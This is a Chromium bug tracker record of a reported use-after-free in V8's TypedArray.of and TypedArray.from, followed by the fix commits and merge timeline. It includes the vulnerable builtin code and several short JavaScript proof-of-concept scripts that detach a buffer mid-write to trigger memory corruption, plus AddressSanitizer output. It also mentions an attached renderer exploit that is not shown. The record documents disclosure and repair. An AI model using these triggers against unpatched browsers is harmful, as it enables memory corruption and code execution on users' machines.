# Security: Use-after-free in TypedArrayOf and TypedArrayFrom

| Field | Value |
|-------|-------|
| **Issue ID** | [40090626](https://issues.chromium.org/issues/40090626) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2018-02-27 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

<https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-typedarray-gen.cc?rcl=58a48f4fa8986318524c1808ce66b5f3e6d2fcb4&l=1519>  

TF\_BUILTIN(TypedArrayOf, TypedArrayBuiltinsAssembler) {  

[...]  

TNode<Object> receiver = args.GetReceiver();  

GotoIf(TaggedIsSmi(receiver), &if\_not\_constructor);  

GotoIfNot(IsConstructor(receiver), &if\_not\_constructor);

// 5. Let newObj be ? TypedArrayCreate(C, len).  

TNode<JSTypedArray> new\_typed\_array =  

CreateByLength(context, receiver, SmiTag(length), "%TypedArray%.of");

TNode<Word32T> elements\_kind = LoadElementsKind(new\_typed\_array);

// 6. Let k be 0.  

// 7. Repeat, while k < len  

// a. Let kValue be items[k].  

// b. Let Pk be ! ToString(k).  

// c. Perform ? Set(newObj, Pk, kValue, true).  

// d. Increase k by 1.  

DispatchTypedArrayByElementsKind(  

elements\_kind,  

[&](ElementsKind kind, int size, int typed\_array\_fun\_index) {  

TNode<FixedTypedArrayBase> elements =  

CAST(LoadElements(new\_typed\_array));  

BuildFastLoop(  

IntPtrConstant(0), length,  

[&](Node\* index) {  

TNode<Object> item = args.AtIndex(index, INTPTR\_PARAMETERS);  

TNode<IntPtrT> intptr\_index = UncheckedCast<IntPtrT>(index);  

if (kind == BIGINT64\_ELEMENTS || kind == BIGUINT64\_ELEMENTS) {  

EmitBigTypedArrayElementStore(  

new\_typed\_array, elements, intptr\_index, item, context,  

nullptr /\* no need to check for neutered buffer \*/);  

} else {  

Node\* value =  

PrepareValueForWriteToTypedArray(item, kind, context);

```
            // GC may move backing store in ToNumber, thus load backing  
            // store everytime in this loop.  
            TNode<RawPtrT> backing_store =  
                LoadFixedTypedArrayBackingStore(elements);  
            StoreElement(backing_store, kind, index, value,  
                         INTPTR_PARAMETERS);  
          }  
          // ToNumber/ToBigInt may execute JavaScript code, but they cannot  
          // access arguments array and new typed array.  

```

The last comment is not quite correct. A user-defined typed array constructor may return an already existing array  

or call the base class constructor with an already existing array buffer. Then JavaScript code called as a side-effect  

of |PrepareValueForWriteToTypedArray()| can neuter the array buffer. |TypedArrayFrom()| contains the same bug.

**VERSION**  

Google Chrome 66.0.3350.0 (Official Build) dev (64-bit) is affected  

Google Chrome 66.0.3355.0 (Official Build) canary (64-bit) is affected

Google Chrome 63.0.3239.132 (Official Build) (64-bit) is not affected  

Google Chrome 65.0.3325.88 (Official Build) beta (64-bit) is not affected

**REPRODUCTION CASE**

<script>
neuter = buffer => { try { postMessage("", "invalid", [buffer]) } catch (e) { } };
array = new Uint8Array(128 \\* 1024 \\* 1024);
Uint8Array.of.call(function() { return array }, {valueOf() { neuter(array.buffer); } });
</script>
<script>
neuter = buffer => { try { postMessage("", "invalid", [buffer]) } catch (e) { } };
buffer = new ArrayBuffer(128 \\* 1024 \\* 1024);
class CustomArray extends Uint8Array { constructor() { super(buffer) } };
CustomArray.of({valueOf() { neuter(buffer); } });
</script>
<script>
neuter = buffer => { try { postMessage("", "invalid", [buffer]) } catch (e) { } };
array = new Uint8Array(128 \\* 1024 \\* 1024);
Uint8Array.from.call(function() { return array }, [{valueOf() { neuter(array.buffer); } }], x => x);
</script>

This one is compatible with ASan builds:

<script>
memory = new WebAssembly.Memory({initial: 64 \\* 1024 \\* 1024 / 0x10000});
array = new Uint8Array(memory.buffer);
Uint8Array.of.call(function() { return array }, {valueOf() { memory.grow(1); } });
</script>

However, the output is not very helpful:  

==11056==ERROR: AddressSanitizer: access-violation on unknown address 0x12e795b40000 (pc 0x12e7739920c7 bp 0x009fc35f98f0 sp 0x009fc35f98a8 T0)  

==11056==The signal is caused by a WRITE memory access.  

#0 0x12e7739920c6 (<unknown module>)  

#1 0x9fc35f98ff (<unknown module>)  

#2 0x12e799c29b20 (<unknown module>)  

#3 0x12e799c29ac0 (<unknown module>)

AddressSanitizer can not provide additional info.  

SUMMARY: AddressSanitizer: access-violation (<unknown module>)

I have also attached a win64 renderer exploit that uses partial overwrite of a PartitionAlloc free list pointer to gain code  

execution.

## Attachments

- [exploit.html](attachments/exploit.html) (text/plain, 5.1 KB)
- [offsets.wds](attachments/offsets.wds) (application/octet-stream, 1.7 KB)

## Timeline

### ke...@chromium.org (2018-02-27)

Thanks for the report. Confirmed on Canary.

jkummerow@ this looks related to the work you have been doing lately. PTAL?

[Monorail components: Blink>JavaScript]

### ke...@chromium.org (2018-02-27)

[Empty comment from Monorail migration]

### ke...@chromium.org (2018-02-27)

[Empty comment from Monorail migration]

### jk...@chromium.org (2018-02-28)

Ugh. JavaScript.

Thanks for the report. Fix: https://chromium-review.googlesource.com/#/c/v8/v8/+/939767

### jk...@chromium.org (2018-02-28)

+hablich for tracking: if the fix misses the branch point, we'll have to backmerge it.

### bu...@chromium.org (2018-02-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/c94df3cec425d6fda250a19b3cc75ef924529e3d

commit c94df3cec425d6fda250a19b3cc75ef924529e3d
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Wed Feb 28 20:52:55 2018

Fix buffer-detached check in TypedArray.of/from

The assert-guarded comment claiming that ToNumber could not
possibly neuter the target array unfortunately turns out to
have been wishful thinking.

Bug: chromium:816961
Change-Id: Ib98f96f4cd7f33414c0b5a6037bfb881938cc15e
Reviewed-on: https://chromium-review.googlesource.com/939767
Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
Reviewed-by: Peter Marshall <petermarshall@chromium.org>
Cr-Commit-Position: refs/heads/master@{#51637}
[modify] https://crrev.com/c94df3cec425d6fda250a19b3cc75ef924529e3d/src/builtins/builtins-typedarray-gen.cc
[modify] https://crrev.com/c94df3cec425d6fda250a19b3cc75ef924529e3d/src/builtins/builtins-typedarray-gen.h
[add] https://crrev.com/c94df3cec425d6fda250a19b3cc75ef924529e3d/test/mjsunit/regress/regress-crbug-816961.js


### ke...@chromium.org (2018-03-02)

jkummerow@: Can we mark this as fixed?

### jk...@chromium.org (2018-03-02)

It's fixed on V8 ToT, but the fix hasn't rolled out on any Canary yet.

Once we have Canary coverage, we should backmerge to 66 and 65.

### sh...@chromium.org (2018-03-03)

[Empty comment from Monorail migration]

### jk...@chromium.org (2018-03-06)

Canary looks fine, requesting merge. (Contrary to what #8 said, 65 is not affected.)

### sh...@chromium.org (2018-03-07)

Your change meets the bar and is auto-approved for M66. Please go ahead and merge the CL to branch 3359 manually. Please contact milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), josafat@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2018-03-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/5ed5c344429a4fd9ca6ddabcee4b586f0332eee2

commit 5ed5c344429a4fd9ca6ddabcee4b586f0332eee2
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Wed Mar 07 01:40:21 2018

Merged: Fix buffer-detached check in TypedArray.of/from

Revision: c94df3cec425d6fda250a19b3cc75ef924529e3d

BUG=chromium:816961
LOG=N
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=adamk@chromium.org

Change-Id: Ib602f4683da2b13bb830d18287b7450de3e2e82f
Reviewed-on: https://chromium-review.googlesource.com/952192
Reviewed-by: Adam Klein <adamk@chromium.org>
Cr-Commit-Position: refs/branch-heads/6.6@{#11}
Cr-Branched-From: d500271571b92cb18dcd7b15885b51e8f437d640-refs/heads/6.6.346@{#1}
Cr-Branched-From: 265ef0b635f8761df7c89eb4e8ec9c1a6ebee184-refs/heads/master@{#51624}
[modify] https://crrev.com/5ed5c344429a4fd9ca6ddabcee4b586f0332eee2/src/builtins/builtins-typedarray-gen.cc
[modify] https://crrev.com/5ed5c344429a4fd9ca6ddabcee4b586f0332eee2/src/builtins/builtins-typedarray-gen.h
[add] https://crrev.com/5ed5c344429a4fd9ca6ddabcee4b586f0332eee2/test/mjsunit/regress/regress-crbug-816961.js


### jk...@chromium.org (2018-03-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-03-13)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-03-13)

Thanks as ever! 

### aw...@google.com (2018-03-16)

[Empty comment from Monorail migration]

### aw...@google.com (2018-03-19)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-03-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-06-26)

This issue was migrated from crbug.com/chromium/816961?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090626)*
